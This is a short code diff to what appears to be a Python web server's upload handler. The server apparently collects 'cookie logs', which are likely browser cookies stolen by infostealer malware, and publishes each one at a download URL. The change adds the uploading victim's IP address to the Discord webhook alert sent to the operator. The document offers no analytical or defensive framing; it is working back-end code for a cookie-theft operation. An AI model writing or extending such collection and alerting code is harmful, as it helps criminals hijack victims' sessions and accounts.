@@ -33,7 +33,8 @@ def upload_file():
     download_url = f'{PUBLIC_BASE_URL}/files/{filename}'
 
     # Notify Discord webhook
-    message = {'content': f'New cookie log uploaded: {download_url}'}
+    client_ip = request.remote_addr
+    message = {'content': f'New cookie log from {client_ip} : {download_url}'}
     try:
         requests.post(DISCORD_WEBHOOK, json=message, timeout=5)
     except Exception as e:
